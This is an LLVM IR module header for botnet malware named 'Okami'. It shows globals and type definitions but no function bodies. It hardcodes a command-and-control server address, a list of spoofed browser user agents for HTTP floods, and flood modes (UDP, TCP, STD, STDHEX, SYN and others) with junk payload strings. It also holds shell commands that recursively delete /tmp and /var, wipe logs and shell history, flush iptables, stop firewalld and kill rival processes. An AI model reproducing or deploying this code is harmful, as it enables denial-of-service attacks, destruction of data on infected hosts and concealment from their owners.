; ModuleID = 'host/ir_bcf/Okami.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"168.235.109.208:6963\00", align 1
@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.17 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.18 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.20 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.21 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.23 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.24 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.25 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.27 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.28 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.30 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.31 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.33 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.36 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.37 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.38 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.39 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.40 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.41 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.42 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.43 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.44 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.45 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.46 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.47 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.48 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.49 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.51 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.52 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.53 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.54 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.55 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.56 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.57 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.58 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.59 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.60 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.61 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.62 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.63 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.64 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.65 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.66 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.67 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.68 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.69 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.70 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.71 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.72 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.12 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.14 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.133 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.73 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@SendSTDHEX.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.75, i32 0, i32 0)], align 8
@.str.75 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)], align 16
@.str.76 = private unnamed_addr constant [17 x i8] c"WYHRzp68omQcEaoW\00", align 1
@.str.77 = private unnamed_addr constant [17 x i8] c"xYjPH0XYQyNnZDd4\00", align 1
@.str.78 = private unnamed_addr constant [20 x i8] c"KaDeNTheBoTNETHeGOD\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"Iger8HgN8DU5Cv2m\00", align 1
@.str.80 = private unnamed_addr constant [17 x i8] c"E0H2DeSLyzQ93Bh2\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"zhYf0MvzTJ1S0ivq\00", align 1
@.str.82 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.83 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.84 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.85 = private unnamed_addr constant [17 x i8] c"UQX1v4chpBay13JL\00", align 1
@.str.86 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.87 = private unnamed_addr constant [17 x i8] c"X1k5ICjenaWIZ4Gf\00", align 1
@.str.88 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.89 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.90 = private unnamed_addr constant [17 x i8] c"1cvFW1QcSuZ627CQ\00", align 1
@.str.91 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.92 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.93 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.95 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.96 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.97 = private unnamed_addr constant [21 x i8] c"UkXK4CDG3OBO1vVufiKv\00", align 1
@.str.98 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.99 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.100 = private unnamed_addr constant [17 x i8] c"SllNepLi918c9I8J\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"Kaden1337\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.103 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.104 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.110 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.112 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.113 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.114 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.116 = private unnamed_addr constant [7 x i8] c"STDHEX\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.119 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.120 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.125 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.126 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.127 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.121 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.122 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.128 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.130 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.132 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
